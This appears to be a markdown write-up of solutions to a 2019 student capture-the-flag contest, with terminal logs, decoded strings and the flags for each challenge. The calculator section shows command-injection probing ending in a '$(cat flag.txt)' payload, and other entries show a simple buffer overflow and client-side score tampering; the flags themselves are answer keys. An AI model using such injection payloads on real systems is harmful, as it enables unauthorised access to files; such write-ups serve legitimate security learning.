@@ -1,0 +1,300 @@
+# Solves
+
+## General Skillz
+
+### SHCALC
+
+```
+root@kali:~/Downloads#  nc shell.2019.nactf.com 31214
+shcalc v1.1
+> ls
+0
+> 1
+1
+> 2
+2
+> 3
+3
+> 4
+4
+> 5
+5
+> eval 
+0
+> help
+0
+> 1000000000000000000000000000000000000000000000000000000000
+9223372036854775807
+> 10000000000000000000000000000000000000000000000000000000000000000000000000000
+9223372036854775807
+> bash
+0
+> /bin/bash
+sh: 1: arithmetic expression: expecting primary: "/bin/bash"
+> ;la                   
+sh: 1: arithmetic expression: expecting primary: ";la"
+> ;ls
+sh: 1: arithmetic expression: expecting primary: ";ls"
+> $
+sh: 1: arithmetic expression: expecting primary: "$"
+> $?   
+0
+> $uname
+sh: 1: arithmetic expression: expecting primary: ""
+> python
+0
+> :shell
+sh: 1: arithmetic expression: expecting primary: ":shell"
+> 1 | ls
+1
+> ^[[A^[[D                                       "
+> : 1: arithmetic expression: expecting primary: "
+sh: 1: arithmetic expression: expecting primary: ""
+> 90 && ls
+0
+> pwd
+0
+> uname -a
+0
+> "
+sh: 1: arithmetic expression: expecting primary: """
+> \
+ls
+0
+> 
+sh: 1: arithmetic expression: expecting primary: ""
+> sh
+0
+> cat flag.txt
+sh: 1: arithmetic expression: expecting EOF: "cat flag.txt"
+> ; cat flag
+sh: 1: arithmetic expression: expecting primary: "; cat flag"
+> ;
+sh: 1: arithmetic expression: expecting primary: ";"
+> \"ls\"   
+sh: 1: arithmetic expression: expecting primary: ""ls""
+> ^C
+root@kali:~/Downloads# pnginfo insignificant_hawkeye.png 
+insignificant_hawkeye.png...
+  Image Width: 332 Image Length: 152
+  Bitdepth (Bits/Sample): 8
+  Channels (Samples/Pixel): 4
+  Pixel depth (Pixel Depth): 32
+  Colour Type (Photometric Interpretation): RGB with alpha channel 
+  Image filter: Single row per byte filter 
+  Interlacing: No interlacing 
+  Compression Scheme: Deflate method 8, 32k window
+  Resolution: 0, 0 (unit unknown)
+  FillOrder: msb-to-lsb
+  Byte Order: Network (Big Endian)
+  Number of text strings: 0
+
+root@kali:~/Downloads# nc shell.2019.nactf.com 31214
+
+shcalc v1.1
+> sh: 1: arithmetic expression: expecting primary: ""
+> exit
+0
+> -1
+-1
+> -100000000000000000000000000000000000000000000000000000000000
+-9223372036854775807
+> 1123
+1123
+> 001
+1
+> export
+0
+> ls     
+0
+> 
+sh: 1: arithmetic expression: expecting primary: ""
+> 1231 | ls
+1231
+> 123; ls
+sh: 1: arithmetic expression: expecting EOF: "123; ls"
+> flag
+0
+> 0; flag
+sh: 1: arithmetic expression: expecting EOF: "0; flag"
+> kill
+0
+> pwd
+0
+> ls=$(ls -la)
+sh: 1: arithmetic expression: expecting EOF: "ls=total 16
+drwxr-xr-x 1 root root 4096 Sep 13 05:38 .
+drwxr-xr-x 1 root root 4096 Sep 17 01:45 ..
+-rwxrwxrwx 1 root root  125 Sep 13 05:38 calc.sh
+-rw-r--r-- 1 root root   29 Sep 13 05:38 flag.txt"
+> flag=$(cat flag)
+cat: flag: No such file or directory
+sh: 1: arithmetic expression: expecting primary: "flag="
+> flag=$(cat flag.txt)
+sh: 1: arithmetic expression: expecting EOF: "flag=nactf{3v4l_1s_3v1l_dCf80yOo}"
+> $(cat flag.txt)
+sh: 1: arithmetic expression: expecting EOF: "nactf{3v4l_1s_3v1l_dCf80yOo}"
+
+```
+
+### Cat over the wire
+```
+root@kali:~/Downloads# nc shell.2019.nactf.com 31242
+nactf{th3_c4ts_0ut_0f_th3_b4g}
+```
+
+### Off Base
+```
+root@kali:~/Downloads# python -c "import base64; print(base64.b64decode('bmFjdGZ7YV9jaDRuZzNfMGZfYmE1ZX0='))"
+nactf{a_ch4ng3_0f_ba5e}
+```
+
+### What the hex?
+```
+root@kali:~/Downloads# python
+Python 2.7.16+ (default, Jul  8 2019, 09:45:29) 
+[GCC 8.3.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> "49207761732e20536f72727920746f2068617665206d697373656420796f752e".decode("hex")
+'I was. Sorry to have missed you.'
+```
+
+### Least Significant Avenger
+```
+root@kali:~/Downloads# zsteg insignificant_hawkeye.png 
+imagedata           .. file: MIPSEL-BE MIPS-III ECOFF executable not stripped - version 0.1
+b1,rgb,lsb,xy       .. text: "nactf{h4wk3y3_15_th3_l34st_51gn1f1c4nt_b1t}"
+b3,g,lsb,xy         .. text: "L4Xe\"Bm\""
+b4,r,msb,xy         .. text: "0s%S@%3dBbQSa"
+b4,g,lsb,xy         .. text: "8vURSDS\"#"
+b4,g,msb,xy         .. text: "NPcDa0P '"
+b4,b,msb,xy         .. text: "veq1q#AR"
+b4,rgb,msb,xy       .. text: "\"qVBvtAqF"
+b4,bgr,msb,xy       .. text: "sFUcS1sDQ2Q!qgs&c1E"
+b4,rgba,lsb,xy      .. text: ";oHO8_vOg_"
+b4,abgr,msb,xy      .. text: "/^O4Op?5"
+root@kali:~/Downloads# 
+```
+
+### GET A GREP#0
+
+```
+srimbp-223:ebooks sri$ unzip bigtree.zip
+srimbp-223:ebooks sri$ cd bigtree
+srimbp-223:bigtree sri$ ls
+branch0 branch1 branch2 branch3 branch4 branch5 branch6 branch7 branch8 branch9
+srimbp-223:bigtree sri$ grep -ir "nactf" *
+branch8/branch3/branch5/leaf8351.txt:nactf{v1kram_and_h1s_10000_l3av3s}
+```
+
+### GET A GREP#1
+```
+srimbp-223:ebooks sri$ grep -irE "nactf{.*[aeiou]{7}}" flag.txt 
+flag.txt:nactf{r3gul4r_3xpr3ss10ns_ar3_m0r3_th4n_r3gul4r_euaiooa}
+```
+
+## Binary Exploitation
+
+### bufferOverflow
+```
+srimbp-223:sri$ nc shell.2019.nactf.com 31475
+Type something>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+You typed AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+You win!
+flag: nactf{0v3rfl0w_th4at_buff3r_18ghKusB}
+
+srimbp-223:sri$ 
+``` 
+
+## Web
+
+### Pink Panther
+```
+<!DOCTYPE html>
+<html>
+<head>
+    <title>The Pink Panther</title>
+</head>
+<body>
+<h1>I love the Pink Panther!</h1>
+<!--Your flag is nactf{1nsp3ct_b3tter_7han_c10us3au}-->
+<img src="https://yt3.ggpht.com/a/AGF-l78vCrsJA9dcV-WpumKDHji5nDADLuCQtvoynQ=s900-c-k-c0xffffffff-no-rj-mo">
+</body>
+</html>
+```
+
+
+### Scooby Doo
+
+* index.html to game.html (view-source:http://scoobydoo.web.2019.nactf.com/game.html)
+```
+<!DOCTYPE HTML>
+<html>
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    
+    <link rel="stylesheet" href="styles.css">
+    <title>Scooby Doo</title>
+</head>
+<body>
+    <div class="menu">
+        <a href="/">Home</a>
+        <a class="active" href="game.html">Game</a>
+    </div>
+
+    <h3>Get 1,000,000,000 clicks and reveal the rest of the flag!</h3>
+    <p id="score">Score: 0</p> 
+    <div id="animationContainer">
+        <button onmouseover="mouseOver()" onclick="mouseClick()" id="button">
+            Click Me!
+        </button>
+    </div>
+    <script src="animation.js"></script>
+    <br>
+    <div id="flagContainer">
+```
+
+* Manipulate the score to receive flag ( obviously not needed to click 1M times )
+  - If server validation, send request to server with score payload
+  - If client validation, alter the js ( play with js? )
+
+```javascript
+let button = document.getElementById("button");
+let container = document.getElementById("animationContainer");
+let containerStyle = window.getComputedStyle(container);
+var width = containerStyle.width;
+width = parseInt(width.substr(0, width.length-2));
+var height = containerStyle.height
+height = parseInt(height.substr(0, height.length-2));
+var buttonTop = "";
+var buttonLeft = "";
+
+var buttonHeight = window.getComputedStyle(button).height;
+buttonHeight = parseInt(buttonHeight.substr(0, buttonHeight.length-2));
+var buttonWidth = window.getComputedStyle(button).width;
+buttonWidth = parseInt(buttonWidth.substr(0, buttonWidth.length-2));
+
+var clickCount = 0;
+
+function mouseOver() {
+    buttonTop = buttonHeight/2 + Math.floor(Math.random() * (height-buttonHeight));
+    buttonLeft = buttonWidth/2 + Math.floor(Math.random() * (width-buttonWidth));
+    $( document ).ready(function() {
+        $("#button").animate({top: buttonTop + "px", left: buttonLeft + "px"});
+    });
+   
+}
+
+function mouseClick() {
+    clickCount ++;
+    document.getElementById("score").innerHTML = "Score: " + clickCount;
+    
+    if (clickCount >= 1000000000) {
+        var elements = document.getElementsByClassName('letter');
+        for (i = 0; i < elements.length; i++) {
+            elements[i].style.opacity = "1";
+        }
+    }
+}
+```
+
